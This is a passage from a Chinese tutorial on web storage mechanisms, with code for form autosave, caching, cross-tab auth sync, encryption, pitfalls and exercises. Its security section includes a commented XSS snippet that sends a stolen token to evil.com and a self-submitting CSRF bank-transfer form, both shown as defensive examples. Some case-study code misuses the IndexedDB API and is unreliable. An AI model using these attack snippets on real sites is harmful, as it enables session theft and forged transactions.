## 6. 存储机制对比

### 6.1 综合对比表

| 维度 | Cookie | localStorage | sessionStorage | IndexedDB |
| ---- | ------ | ------------ | --------------- | --------- |
| 容量 | 4KB | 5-10MB | 5-10MB | 数百MB-数GB |
| 生命周期 | 可设过期 | 永久 | 标签页关闭 | 永久 |
| API | 字符串 | 键值对 | 键值对 | NoSQL 事务 |
| 异步 | 否 | 否 | 否 | 是 |
| 随请求发送 | 是 | 否 | 否 | 否 |
| 同源隔离 | 是 | 是 | 是（+浏览上下文） | 是 |
| 事务支持 | 否 | 否 | 否 | 是 |
| 索引查询 | 否 | 否 | 否 | 是 |
| Web Worker 访问 | 否 | 否 | 否 | 是 |
| Service Worker 访问 | 否 | 否 | 否 | 是 |

### 6.2 性能对比

```javascript
// 性能测试：写入 10000 条数据
function performanceTest() {
  const COUNT = 10000;
  const data = Array.from({ length: COUNT }, (_, i) => ({
    id: i,
    name: `User${i}`,
    email: `user${i}@example.com`,
  }));

  // localStorage 性能（同步阻塞）
  console.time('localStorage');
  data.forEach(item => {
    localStorage.setItem(`user_${item.id}`, JSON.stringify(item));
  });
  console.timeEnd('localStorage');  // 典型：500-2000ms

  // IndexedDB 性能（异步非阻塞）
  console.time('IndexedDB');
  const request = indexedDB.open('TestDB', 1);
  request.onupgradeneeded = (e) => {
    const db = e.target.result;
    if (!db.objectStoreNames.contains('users')) {
      db.createObjectStore('users', { keyPath: 'id' });
    }
  };
  request.onsuccess = async (e) => {
    const db = e.target.result;
    const tx = db.transaction('users', 'readwrite');
    const store = tx.objectStore('users');
    data.forEach(item => store.put(item));
    tx.oncomplete = () => {
      console.timeEnd('IndexedDB');  // 典型：100-500ms
    };
  };
}
```

### 6.3 适用场景对比

| 场景 | 推荐机制 | 原因 |
| ---- | -------- | ---- |
| 用户会话令牌 | Cookie + HttpOnly + Secure | 防 XSS，自动随请求发送 |
| 用户偏好设置 | localStorage | 持久化，API 简单 |
| 临时表单数据 | sessionStorage | 标签页关闭自动清除 |
| 离线数据缓存 | IndexedDB | 大容量，结构化，异步 |
| 购物车（轻量） | localStorage | API 简单，跨标签页同步 |
| 购物车（重量） | IndexedDB | 大容量，事务保证 |
| 媒体缓存 | Cache API | 专为 Response 对象设计 |
| 用户行为日志 | IndexedDB | 大容量，批量写入 |

---

## 7. 实战应用

### 7.1 表单自动保存

```javascript
/**
 * 表单自动保存工具
 * 防止用户因意外关闭丢失输入
 */
class FormAutoSave {
  constructor(formId, options = {}) {
    this.form = document.getElementById(formId);
    this.storageKey = options.key || `form_${formId}`;
    this.interval = options.interval || 5000;  // 默认 5 秒
    this.storage = options.storage || sessionStorage;

    this.timer = null;
    this.init();
  }

  init() {
    // 监听输入事件
    this.form.addEventListener('input', () => {
      this.scheduleSave();
    });

    // 页面加载时恢复数据
    this.restore();

    // 表单提交时清除
    this.form.addEventListener('submit', () => {
      this.clear();
    });
  }

  scheduleSave() {
    clearTimeout(this.timer);
    this.timer = setTimeout(() => this.save(), this.interval);
  }

  save() {
    const data = new FormData(this.form);
    const obj = {};
    data.forEach((value, key) => {
      obj[key] = value;
    });
    this.storage.setItem(this.storageKey, JSON.stringify({
      data: obj,
      timestamp: Date.now(),
    }));
    console.log('表单已自动保存');
  }

  restore() {
    const raw = this.storage.getItem(this.storageKey);
    if (!raw) return;

    try {
      const { data, timestamp } = JSON.parse(raw);
      const age = Date.now() - timestamp;

      // 超过 1 小时的数据不恢复
      if (age > 3600000) {
        this.clear();
        return;
      }

      Object.entries(data).forEach(([key, value]) => {
        const field = this.form.elements[key];
        if (field) field.value = value;
      });

      console.log('已恢复未提交的表单数据');
    } catch (e) {
      console.error('恢复表单失败:', e);
      this.clear();
    }
  }

  clear() {
    this.storage.removeItem(this.storageKey);
  }
}

// 使用
const autoSave = new FormAutoSave('myForm', { interval: 3000 });
```

### 7.2 离线数据缓存

```javascript
/**
 * 离线数据缓存工具
 * 结合 IndexedDB 与 localStorage
 */
class OfflineCache {
  constructor() {
    this.dbName = 'OfflineCacheDB';
    this.dbVersion = 1;
    this.db = null;
    this.metaStorage = new NamespacedStorage('cacheMeta');
  }

  async init() {
    return new Promise((resolve, reject) => {
      const request = indexedDB.open(this.dbName, this.dbVersion);
      request.onupgradeneeded = (e) => {
        const db = e.target.result;
        if (!db.objectStoreNames.contains('cache')) {
          db.createObjectStore('cache', { keyPath: 'key' });
        }
      };
      request.onsuccess = (e) => {
        this.db = e.target.result;
        resolve();
      };
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 缓存数据
   */
  async set(key, value, ttl = 3600000) {
    const item = {
      key,
      value,
      expiry: Date.now() + ttl,
      createdAt: Date.now(),
    };

    // 元数据存 localStorage（用于快速判断是否存在）
    this.metaStorage.set(key, { expiry: item.expiry });

    // 实际数据存 IndexedDB
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cache', 'readwrite');
      const store = tx.objectStore('cache');
      const request = store.put(item);
      request.onsuccess = () => resolve(true);
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 读取数据
   */
  async get(key) {
    // 先检查元数据是否过期
    const meta = this.metaStorage.get(key);
    if (!meta || Date.now() > meta.expiry) {
      await this.delete(key);
      return null;
    }

    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cache', 'readonly');
      const store = tx.objectStore('cache');
      const request = store.get(key);
      request.onsuccess = () => {
        const item = request.result;
        resolve(item ? item.value : null);
      };
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 删除数据
   */
  async delete(key) {
    this.metaStorage.remove(key);
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cache', 'readwrite');
      const store = tx.objectStore('cache');
      const request = store.delete(key);
      request.onsuccess = () => resolve(true);
      request.onerror = () => reject(request.error);
    });
  }

  /**
   * 清理所有过期数据
   */
  async cleanup() {
    return new Promise((resolve, reject) => {
      const tx = this.db.transaction('cache', 'readwrite');
      const store = tx.objectStore('cache');
      const request = store.openCursor();
      const now = Date.now();
      const toDelete = [];

      request.onsuccess = (e) => {
        const cursor = e.target.result;
        if (cursor) {
          if (cursor.value.expiry < now) {
            toDelete.push(cursor.value.key);
          }
          cursor.continue();
        } else {
          // 删除过期项
          toDelete.forEach(key => {
            store.delete(key);
            this.metaStorage.remove(key);
          });
          resolve(toDelete.length);
        }
      };
      request.onerror = () => reject(request.error);
    });
  }
}

// 使用
const cache = new OfflineCache();
await cache.init();
await cache.set('users', [{ name: 'Alice' }], 5 * 60 * 1000);
const users = await cache.get('users');
```

### 7.3 多标签页登录状态同步

```javascript
/**
 * 多标签页登录状态同步
 * 当一个标签页登出时，所有标签页同步登出
 */
class AuthSync {
  constructor() {
    this.sync = new CrossTabSync('auth_state');
    this.sync.subscribe((state) => {
      if (state && state.action === 'logout') {
        this.handleLogout();
      } else if (state && state.action === 'login') {
        this.handleLogin(state.user);
      }
    });
  }

  login(user) {
    // 存储用户信息（不含敏感令牌）
    jsonStorage.set('currentUser', user);
    // 令牌存 HttpOnly Cookie（由服务器设置）

    // 通知其他标签页
    this.sync.setState({
      action: 'login',
      user,
      timestamp: Date.now(),
    });
  }

  logout() {
    // 清除本地存储
    jsonStorage.remove('currentUser');
    // 通知服务器使令牌失效
    fetch('/api/logout', { method: 'POST', credentials: 'include' });

    // 通知其他标签页
    this.sync.setState({
      action: 'logout',
      timestamp: Date.now(),
    });
  }

  handleLogin(user) {
    jsonStorage.set('currentUser', user);
    // 更新 UI
    window.dispatchEvent(new CustomEvent('auth:login', { detail: user }));
  }

  handleLogout() {
    jsonStorage.remove('currentUser');
    // 更新 UI
    window.dispatchEvent(new CustomEvent('auth:logout'));
    // 重定向到登录页
    window.location.href = '/login';
  }

  getCurrentUser() {
    return jsonStorage.get('currentUser');
  }
}

// 使用
const auth = new AuthSync();
// 在任何标签页调用 auth.logout()，所有标签页都会同步登出
```

### 7.4 主题切换持久化

```javascript
/**
 * 主题切换持久化
 * 支持跨标签页同步
 */
class ThemeManager {
  constructor() {
    this.storageKey = 'theme';
    this.themes = ['light', 'dark', 'auto'];
    this.currentTheme = this.loadTheme();

    // 跨标签页同步
    window.addEventListener('storage', (e) => {
      if (e.key === this.storageKey && e.newValue) {
        this.applyTheme(JSON.parse(e.newValue).theme);
      }
    });

    // 系统主题变化时（auto 模式）
    if (window.matchMedia) {
      window.matchMedia('(prefers-color-scheme: dark)')
        .addEventListener('change', () => {
          if (this.currentTheme === 'auto') {
            this.applyTheme('auto');
          }
        });
    }

    this.applyTheme(this.currentTheme);
  }

  loadTheme() {
    const stored = jsonStorage.get(this.storageKey);
    return stored ? stored.theme : 'auto';
  }

  saveTheme(theme) {
    jsonStorage.set(this.storageKey, { theme, updatedAt: Date.now() });
  }

  setTheme(theme) {
    if (!this.themes.includes(theme)) {
      throw new Error(`Invalid theme: ${theme}`);
    }
    this.currentTheme = theme;
    this.saveTheme(theme);
    this.applyTheme(theme);
  }

  applyTheme(theme) {
    const root = document.documentElement;
    let actualTheme = theme;

    if (theme === 'auto') {
      actualTheme = window.matchMedia &&
        window.matchMedia('(prefers-color-scheme: dark)').matches
        ? 'dark'
        : 'light';
    }

    root.setAttribute('data-theme', actualTheme);
    window.dispatchEvent(new CustomEvent('theme:change', {
      detail: { theme, actualTheme },
    }));
  }

  getTheme() {
    return this.currentTheme;
  }
}

// 使用
const themeManager = new ThemeManager();
themeManager.setTheme('dark');
```

---

## 8. 安全考量

### 8.1 XSS 攻击与防御

XSS（跨站脚本攻击）可读取 localStorage 与 sessionStorage：

```javascript
// 攻击者注入的恶意脚本
// <script>
//   const token = localStorage.getItem('authToken');
//   fetch('https://evil.com/steal?token=' + token);
// </script>

// 防御策略：
// 1. 不要在 localStorage 存储敏感令牌，改用 HttpOnly Cookie
// 2. 对用户输入进行严格转义
// 3. 使用 Content-Security-Policy 限制脚本来源
// 4. 使用 Trusted Types API 防止 DOM 注入

// CSP 头示例
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

### 8.2 CSRF 攻击与防御

CSRF（跨站请求伪造）利用 Cookie 自动发送的特性：

```javascript
// 攻击场景：
// 用户已登录 bank.com，浏览器保存 session Cookie
// 用户访问 evil.com，其中包含：
// <form action="https://bank.com/transfer" method="POST">
//   <input name="to" value="attacker">
//   <input name="amount" value="10000">
// </form>
// <script>document.forms[0].submit();</script>

// 防御策略：
// 1. 设置 SameSite=Strict 或 Lax
setCookie('session', token, { sameSite: 'Strict', secure: true, httpOnly: true });

// 2. 使用 CSRF Token
const csrfToken = generateRandomToken();
jsonStorage.set('csrfToken', csrfToken);
// 在每个请求中携带
fetch('/api/data', {
  headers: { 'X-CSRF-Token': csrfToken },
  credentials: 'include',
});

// 3. 验证 Origin / Referer 头
// 服务器端检查请求来源
```

### 8.3 Cookie 安全配置最佳实践

```javascript
// 会话 Cookie：最高安全级别
setCookie('session', sessionToken, {
  maxAge: 3600,           // 1 小时
  secure: true,           // 仅 HTTPS
  httpOnly: true,         // 防 XSS 读取
  sameSite: 'Strict',     // 完全禁跨站
  path: '/',
});

// 持久登录 Cookie：平衡安全与可用性
setCookie('rememberme', rememberToken, {
  maxAge: 30 * 86400,     // 30 天
  secure: true,
  httpOnly: true,
  sameSite: 'Lax',        // 允许顶层导航
  path: '/',
});

// 第三方追踪 Cookie：需明确告知用户
setCookie('tracking', trackingId, {
  maxAge: 365 * 86400,
  secure: true,
  sameSite: 'None',       // 允许跨站
  path: '/',
});
```

### 8.4 存储数据加密

```javascript
/**
 * 加密存储工具
 * 使用 WebCrypto API 加密敏感数据
 */
class EncryptedStorage {
  constructor() {
    this.key = null;
  }

  /**
   * 初始化加密密钥
   */
  async init(password) {
    const encoder = new TextEncoder();
    const passwordKey = await crypto.subtle.importKey(
      'raw',
      encoder.encode(password),
      'PBKDF2',
      false,
      ['deriveKey']
    );

    this.key = await crypto.subtle.deriveKey(
      {
        name: 'PBKDF2',
        salt: encoder.encode('fixed-salt'),  // 实际应使用随机盐
        iterations: 100000,
        hash: 'SHA-256',
      },
      passwordKey,
      { name: 'AES-GCM', length: 256 },
      false,
      ['encrypt', 'decrypt']
    );
  }

  async encrypt(data) {
    const encoder = new TextEncoder();
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
      { name: 'AES-GCM', iv },
      this.key,
      encoder.encode(JSON.stringify(data))
    );
    return { iv, data: encrypted };
  }

  async decrypt(encrypted) {
    const decoder = new TextDecoder();
    const decrypted = await crypto.subtle.decrypt(
      { name: 'AES-GCM', iv: encrypted.iv },
      this.key,
      encrypted.data
    );
    return JSON.parse(decoder.decode(decrypted));
  }

  async set(key, value) {
    const encrypted = await this.encrypt(value);
    const serialized = JSON.stringify({
      iv: Array.from(encrypted.iv),
      data: Array.from(new Uint8Array(encrypted.data)),
    });
    localStorage.setItem(key, serialized);
  }

  async get(key) {
    const raw = localStorage.getItem(key);
    if (!raw) return null;
    const parsed = JSON.parse(raw);
    const encrypted = {
      iv: new Uint8Array(parsed.iv),
      data: new Uint8Array(parsed.data).buffer,
    };
    return await this.decrypt(encrypted);
  }
}

// 使用
const secureStorage = new EncryptedStorage();
await secureStorage.init('user-password');
await secureStorage.set('secret', { apikey: '...' });
const secret = await secureStorage.get('secret');
```

---

## 9. 常见陷阱

### 9.1 localStorage 容量超限

```javascript
// 错误：未捕获 QuotaExceededError
try {
  localStorage.setItem('huge', 'a'.repeat(100 * 1024 * 1024));  // 100MB
} catch (e) {
  // QuotaExceededError
  console.error('存储超限:', e);
  // 应清理旧数据或提示用户
}

// 修复：添加配额检查与清理
function safeSetItem(key, value) {
  try {
    localStorage.setItem(key, value);
    return true;
  } catch (e) {
    if (e.name === 'QuotaExceededError') {
      // 尝试清理旧数据
      cleanupOldEntries();
      try {
        localStorage.setItem(key, value);
        return true;
      } catch (e2) {
        console.error('存储空间不足，请手动清理');
        return false;
      }
    }
    throw e;
  }
}
```

### 9.2 JSON 解析失败

```javascript
// 错误：未处理 JSON 解析异常
const user = JSON.parse(localStorage.getItem('user'));  // 可能抛出 SyntaxError

// 修复：try-catch 包裹
function safeParse(str, defaultValue = null) {
  try {
    return str ? JSON.parse(str) : defaultValue;
  } catch (e) {
    console.error('JSON parse failed:', e);
    return defaultValue;
  }
}
const user = safeParse(localStorage.getItem('user'));
```

### 9.3 sessionStorage 误解

```javascript
// 误解：sessionStorage 在所有标签页共享
// 实际：每个标签页独立，即使同源

// 误解：sessionStorage 数据在刷新后丢失
// 实际：刷新后仍存在，仅标签页关闭时清除

// 误解：iframe 与父页面共享 sessionStorage
// 实际：iframe 是独立浏览上下文，sessionStorage 隔离
```

### 9.4 Cookie 路径误解

```javascript
// 误解：Path=/app 限制 Cookie 仅在 /app 路径下可访问
// 实际：Path 仅限制发送，不限制 JS 访问
// document.cookie 仍可读取所有路径的 Cookie

// 误解：删除 Cookie 时只需名称匹配
// 实际：必须匹配 Path 与 Domain，否则无法删除
setCookie('user', 'Alice', { path: '/app' });
// 以下无法删除（路径不匹配）
document.cookie = 'user=; Max-Age=0; Path=/';
// 正确删除
document.cookie = 'user=; Max-Age=0; Path=/app';
```

### 9.5 storage 事件不触发

```javascript
// 误解：localStorage.setItem 会触发本标签页的 storage 事件
// 实际：仅在相同源的其他标签页触发

// 误解：storage 事件在隐私模式下正常工作
// 实际：隐私模式下 localStorage 可能被禁用或限制

// 修复：手动派发事件
function setItemWithEvent(key, value) {
  const oldValue = localStorage.getItem(key);
  localStorage.setItem(key, value);
  // 手动派发本标签页事件
  window.dispatchEvent(new StorageEvent('storage', {
    key,
    oldValue,
    newValue: value,
    url: window.location.href,
    storageArea: localStorage,
  }));
}
```

### 9.6 IndexedDB 事务自动关闭

```javascript
// 错误：在事务完成后操作
let db;
const request = indexedDB.open('DB');
request.onsuccess = (e) => {
  db = e.target.result;
};

// 异步操作中事务可能已关闭
setTimeout(() => {
  const tx = db.transaction('store', 'readwrite');
  // ... 异步操作
  setTimeout(() => {
    // 事务可能已自动提交，操作失败
    tx.objectStore('store').put(data);
  }, 100);
}, 1000);

// 修复：在同一事件循环中完成事务操作
function performTransaction(db, callback) {
  const tx = db.transaction('store', 'readwrite');
  const store = tx.objectStore('store');
  callback(store);
  // 事务在当前事件循环结束后自动提交
}
```

### 9.7 隐私模式存储限制

```javascript
// 隐私模式下 localStorage 可能抛出异常或配额为 0
try {
  localStorage.setItem('test', 'value');
  const value = localStorage.getItem('test');
  if (value !== 'value') {
    // 隐私模式或存储被禁用
    console.warn('Storage may be disabled');
  }
} catch (e) {
  console.warn('Storage not available:', e);
  // 降级方案：内存存储
}

// 内存存储降级方案
const memoryStorage = {
  data: new Map(),
  getItem(key) { return this.data.has(key) ? this.data.get(key) : null; },
  setItem(key, value) { this.data.set(key, value); },
  removeItem(key) { this.data.delete(key); },
  clear() { this.data.clear(); },
  get length() { return this.data.size; },
  key(i) { return Array.from(this.data.keys())[i]; },
};
```

---

## 10. 工程实践

### 10.1 存储抽象层设计

```javascript
/**
 * 统一存储抽象层
 * 自动选择最佳存储机制，提供统一 API
 */
class UnifiedStorage {
  constructor(namespace = 'app') {
    this.namespace = namespace;
    this.backend = this.detectBackend();
  }

  /**
   * 检测可用的存储后端
   */
  detectBackend() {
    // 优先级：localStorage > sessionStorage > memory
    try {
      const test = '__test__';
      localStorage.setItem(test, test);
      localStorage.removeItem(test);
      return localStorage;
    } catch (e) {
      try {
        const test = '__test__';
        sessionStorage.setItem(test, test);
        sessionStorage.removeItem(test);
        return sessionStorage;
      } catch (e2) {
        return memoryStorage;
      }
    }
  }

  _key(key) {
    return `${this.namespace}:${key}`;
  }

  set(key, value) {
    try {
      this.backend.setItem(this._key(key), JSON.stringify(value));
      return true;
    } catch (e) {
      console.error('Storage set failed:', e);
      return false;
    }
  }

  get(key, defaultValue = null) {
    try {
      const raw = this.backend.getItem(this._key(key));
      return raw ? JSON.parse(raw) : defaultValue;
    } catch (e) {
      console.error('Storage get failed:', e);
      return defaultValue;
    }
  }

  remove(key) {
    this.backend.removeItem(this._key(key));
  }

  clear() {
    const keys = [];
    for (let i = 0; i < this.backend.length; i++) {
      const key = this.backend.key(i);
      if (key.startsWith(`${this.namespace}:`)) {
        keys.push(key);
      }
    }
    keys.forEach(key => this.backend.removeItem(key));
  }
}
```

### 10.2 TypeScript 类型支持

```typescript
interface StorageItem<T> {
  value: T;
  expiry?: number;
  createdAt: number;
}

class TypedStorage<T extends Record<string, any>> {
  constructor(private namespace: string) {}

  set<K extends keyof T>(key: K, value: T[K], ttl?: number): boolean {
    // ... 实现
  }

  get<K extends keyof T>(key: K, defaultValue?: T[K]): T[K] | null {
    // ... 实现
  }
}

// 使用
interface AppStorage {
  user: { name: string; age: number };
  theme: 'light' | 'dark';
  token: string;
}

const storage = new TypedStorage<AppStorage>('app');
storage.set('user', { name: 'Alice', age: 30 });  // 类型安全
storage.set('theme', 'dark');
// storage.set('theme', 'blue');  // 类型错误
```

### 10.3 数据迁移与版本升级

```javascript
/**
 * 存储数据迁移工具
 * 用于 schema 版本升级
 */
class StorageMigrator {
  constructor(namespace) {
    this.namespace = namespace;
    this.storage = new NamespacedStorage(namespace);
    this.migrations = [];
  }

  /**
   * 注册迁移函数
   */
  addMigration(fromVersion, toVersion, migrateFn) {
    this.migrations.push({ fromVersion, toVersion, migrateFn });
  }

  /**
   * 执行迁移
   */
  async migrate(targetVersion) {
    let currentVersion = this.storage.get('__version__', 0);

    while (currentVersion < targetVersion) {
      const migration = this.migrations.find(
        m => m.fromVersion === currentVersion
      );
      if (!migration) {
        throw new Error(`No migration from version ${currentVersion}`);
      }

      console.log(`Migrating from ${currentVersion} to ${migration.toVersion}`);
      await migration.migrateFn(this.storage);
      currentVersion = migration.toVersion;
      this.storage.set('__version__', currentVersion);
    }
  }
}

// 使用
const migrator = new StorageMigrator('app');
migrator.addMigration(0, 1, (storage) => {
  // v0 -> v1: 重命名 user.name 为 user.fullName
  const user = storage.get('user');
  if (user && user.name) {
    user.fullName = user.name;
    delete user.name;
    storage.set('user', user);
  }
});
migrator.addMigration(1, 2, (storage) => {
  // v1 -> v2: 添加 createdAt 字段
  const user = storage.get('user');
  if (user && !user.createdAt) {
    user.createdAt = Date.now();
    storage.set('user', user);
  }
});

await migrator.migrate(2);
```

### 10.4 单元测试

```javascript
// 使用 Jest 测试存储工具
describe('jsonStorage', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  test('set/get 基本操作', () => {
    jsonStorage.set('key', { name: 'Alice' });
    expect(jsonStorage.get('key')).toEqual({ name: 'Alice' });
  });

  test('默认值', () => {
    expect(jsonStorage.get('missing', 'default')).toBe('default');
  });

  test('删除', () => {
    jsonStorage.set('key', 'value');
    jsonStorage.remove('key');
    expect(jsonStorage.get('key')).toBeNull();
  });

  test('JSON 解析失败时返回默认值', () => {
    localStorage.setItem('broken', '{invalid json}');
    expect(jsonStorage.get('broken', 'default')).toBe('default');
  });
});

describe('ttlStorage', () => {
  beforeEach(() => {
    localStorage.clear();
    jest.useFakeTimers();
  });

  afterEach(() => {
    jest.useRealTimers();
  });

  test('未过期返回数据', () => {
    ttlStorage.set('key', 'value', 1000);
    expect(ttlStorage.get('key')).toBe('value');
  });

  test('过期后返回 null', () => {
    ttlStorage.set('key', 'value', 1000);
    jest.advanceTimersByTime(1001);
    expect(ttlStorage.get('key')).toBeNull();
  });
});
```

### 10.5 ESLint 规则

```json
{
  "rules": {
    "no-restricted-globals": ["error", "localStorage", "sessionStorage"],
    "no-restricted-syntax": [
      "error",
      {
        "selector": "MemberExpression[property.name='cookie']",
        "message": "Use setCookie/getCookie helpers instead of raw document.cookie"
      }
    ]
  }
}
```

---

## 11. 案例研究

### 11.1 Reddit 的离线缓存策略

Reddit 使用 Service Worker + Cache API + IndexedDB 实现离线浏览：

```javascript
// Service Worker: 缓存静态资源
self.addEventListener('install', (event) => {
  event.waitUntil(
    caches.open('static-v1').then(cache => cache.addAll([
      '/',
      '/static/css/main.css',
      '/static/js/main.js',
    ]))
  );
});

self.addEventListener('fetch', (event) => {
  // 网络优先，失败时回退缓存
  event.respondWith(
    fetch(event.request).catch(() => caches.match(event.request))
  );
});

// 主线程：缓存 API 数据到 IndexedDB
async function fetchWithCache(url) {
  try {
    const response = await fetch(url);
    const data = await response.json();
    // 缓存到 IndexedDB
    await cacheDB.set(url, data, 5 * 60 * 1000);  // 5 分钟
    return data;
  } catch (e) {
    // 网络失败，从缓存读取
    const cached = await cacheDB.get(url);
    if (cached) return cached;
    throw e;
  }
}
```

### 11.2 Twitter 的 PWA 存储

Twitter PWA 使用 IndexedDB 存储时间线数据，实现即时加载：

```javascript
// 时间线缓存
class TimelineCache {
  constructor() {
    this.dbName = 'TwitterDB';
    this.storeName = 'timeline';
  }

  async init() {
    // IndexedDB 初始化
  }

  /**
   * 获取时间线（先返回缓存，再后台更新）
   */
  async getTimeline(userId) {
    // 1. 立即返回缓存数据
    const cached = await this.getCachedTimeline(userId);

    // 2. 后台拉取最新数据
    this.refreshTimeline(userId);

    return cached;
  }

  async getCachedTimeline(userId) {
    // 从 IndexedDB 读取
  }

  async refreshTimeline(userId) {
    const response = await fetch(`/api/timeline?userId=${userId}`);
    const tweets = await response.json();
    await this.saveTweets(userId, tweets);
  }

  async saveTweets(userId, tweets) {
    // 批量写入 IndexedDB
  }
}
```

### 11.3 Notion 的协同编辑

Notion 使用 IndexedDB 缓存文档，支持离线编辑与冲突解决：

```javascript
class DocumentCache {
  async saveLocal(docId, content) {
    await indexedDB.put('documents', {
      docId,
      content,
      lastModified: Date.now(),
      syncStatus: 'pending',
    });
  }

  async syncWithServer(docId) {
    const local = await indexedDB.get('documents', docId);
    const server = await fetch(`/api/docs/${docId}`).then(r => r.json());

    // 冲突检测
    if (local.lastModified > server.lastModified) {
      // 本地较新，推送
      await fetch(`/api/docs/${docId}`, {
        method: 'PUT',
        body: JSON.stringify(local),
      });
    } else {
      // 服务器较新，更新本地
      await indexedDB.put('documents', server);
    }
  }
}
```

### 11.4 GitHub 的代码搜索缓存

GitHub 使用 IndexedDB 缓存搜索结果，提升重复查询速度：

```javascript
class SearchCache {
  async search(query) {
    const cacheKey = `search:${query}`;
    const cached = await this.cache.get(cacheKey);
    if (cached && Date.now() - cached.timestamp < 60000) {
      return cached.results;  // 1 分钟内缓存有效
    }

    const results = await fetch(`/api/search?q=${query}`).then(r => r.json());
    await this.cache.set(cacheKey, { results, timestamp: Date.now() });
    return results;
  }
}
```

### 11.5 Google Docs 的协同同步

Google Docs 使用 IndexedDB + Operational Transformation 实现协同编辑：

```javascript
// 操作日志本地存储
class OperationLog {
  async logOp(docId, op) {
    await indexedDB.add('operations', {
      docId,
      op,
      timestamp: Date.now(),
      synced: false,
    });
  }

  async getUnsyncedOps(docId) {
    return await indexedDB.getAll('operations', {
      index: 'docId',
      range: IDBKeyRange.only(docId),
      filter: op => !op.synced,
    });
  }

  async markSynced(opIds) {
    const tx = indexedDB.transaction('operations', 'readwrite');
    for (const id of opIds) {
      const op = await tx.store.get(id);
      op.synced = true;
      await tx.store.put(op);
    }
  }
}
```

---

## 12. 习题

### 12.1 习题详解

本节提供 7 道习题，覆盖填空、选择、代码修正、开放性问题四类题型，对应 Bloom 六个认知层次。

**习题 1（填空题，Remember）**

题目：Web Storage 包含 localStorage 与 ______ 两种机制，前者生命周期为 ______，后者生命周期为标签页关闭。

答案：`sessionStorage`、`永久`

解析：Web Storage 规范定义了两种存储机制。localStorage 数据永久存储，除非显式清除；sessionStorage 数据在标签页关闭时自动清除，适合临时数据。

**习题 2（填空题，Understand）**

题目：Cookie 的 ______ 属性可防止 JavaScript 通过 document.cookie 访问，从而防御 ______ 攻击；______ 属性限制 Cookie 仅在 HTTPS 连接下发送。

答案：`HttpOnly`、`XSS`、`Secure`

解析：HttpOnly 属性使 Cookie 无法通过 JavaScript 访问，防御 XSS 攻击窃取会话令牌。Secure 属性确保 Cookie 仅在加密的 HTTPS 连接下发送，防止中间人攻击。这两个属性是会话 Cookie 的必备安全配置。

**习题 3（选择题，Understand）**

题目：下列关于 localStorage 与 sessionStorage 区别的描述，哪项是错误的？

正确答案：D（sessionStorage 在同一标签页的不同 iframe 中共享）

解析：sessionStorage 在浏览上下文（browsing context）级别隔离。每个 iframe 是独立的浏览上下文，因此其 sessionStorage 与父页面相互隔离。其他三项描述均正确。

**习题 4（选择题，Analyze）**

题目：在以下场景中，哪种存储机制最合适保存用户的敏感会话令牌（session token）？

正确答案：C（Cookie 配合 Secure、HttpOnly、SameSite=Strict 属性）

解析：敏感会话令牌需满足三重安全要求：(1) 防 XSS 读取——HttpOnly；(2) 仅 HTTPS 传输——Secure；(3) 防 CSRF——SameSite=Strict。localStorage 与 sessionStorage 均可被 JavaScript 访问，存在 XSS 风险；IndexedDB 过于复杂且同样可被 JS 访问。

**习题 5（代码修正题，Apply）**

题目：以下函数意图将对象存入 localStorage 并设置 1 小时过期，但存在缺陷。请修复。

修复要点：
1. 合并为单个对象存储（值 + 过期时间）
2. 添加 try-catch 处理 JSON 解析异常
3. 处理 null 检查

解析：原实现将值与 TTL 分开存储，存在两个问题：(1) 原子性差，两次 setItem 可能只成功一次；(2) getItem 在键不存在时返回 null，Number(null) 为 0 导致 Date.now() > 0 永远为真，数据立即过期。修复后合并为单个对象，并添加异常处理。

**习题 6（代码修正题，Evaluate）**

题目：以下跨标签页同步函数无法在所有浏览器中正常工作，且未处理 Storage 事件。请修复。

修复要点：
1. 手动派发 StorageEvent 触发本标签页回调
2. 对 JSON 解析添加异常处理
3. 检查 e.newValue !== null

解析：storage 事件仅在相同源的**其他**标签页触发，不在修改自身的标签页触发。若需在所有标签页（包括自身）响应变化，需手动派发 StorageEvent。此外，JSON.parse 可能因数据损坏失败，需 try-catch 包裹。

**习题 7（开放性问题，Create）**

题目：你正在设计一个离线优先的笔记应用，要求支持离线编辑、跨设备同步、冲突解决。请论述如何组合使用 Service Worker、Cache API、IndexedDB、localStorage，包括：(1) 离线缓存策略；(2) 数据同步模型；(3) 冲突检测与解决；(4) 存储容量管理；(5) 数据迁移与版本升级；(6) 隐私与安全考虑。给出架构设计与示例代码。

关键评分点：
1. 提出分层存储架构（Cache API 缓存资源、IndexedDB 存数据、localStorage 存配置）
2. 论述 Service Worker 拦截网络请求实现离线优先
3. 处理冲突解决的两种策略（LWW 简单但易丢数据，CRDT 复杂但保证收敛）
4. 给出存储配额检测与清理策略（navigator.storage.estimate）
5. 设计 IndexedDB schema 版本升级流程
6. 处理敏感数据加密（WebCrypto API）

---

## 13. 参考文献

1. Hickson, I. 2016. *Web Storage (Second Edition) - W3C Recommendation*. W3C. Retrieved from https://www.w3.org/TR/webstorage/

2. West, M. 2026. *HTTP State Management Mechanism (RFC 6265bis)*. IETF. Retrieved from https://datatracker.ietf.org/doc/html/rfc6265bis

3. van Kesteren, A. 2026. *Storage Standard - Living Standard*. WHATWG. Retrieved from https://storage.spec.whatwg.org/

4. Marathe, N. and Sicking, J. 2026. *Indexed Database API 3.0*. W3C. Retrieved from https://www.w3.org/TR/IndexedDB-3/

5. Flanagan, D. 2020. *JavaScript: The Definitive Guide* (7th ed.). O'Reilly Media, 1-704. DOI: 10.5555/3372471.

6. Haverbeke, M. 2019. *Eloquent JavaScript* (3rd ed.). No Starch Press, 1-448. Retrieved from https://eloquentjavascript.net/

7. Barth, A. 2011. *HTTP State Management Mechanism*. IETF RFC 6265. Retrieved from https://datatracker.ietf.org/doc/html/rfc6265

8. MDN Web Docs. 2025. *Web Storage API*. Mozilla Developer Network. Retrieved from https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API

9. Archibald, J. 2018. Storage for the web. *web.dev*. Retrieved July 20, 2026, from https://web.dev/articles/storage-for-the-web

---

## 14. 延伸阅读

### 14.1 官方规范与文档

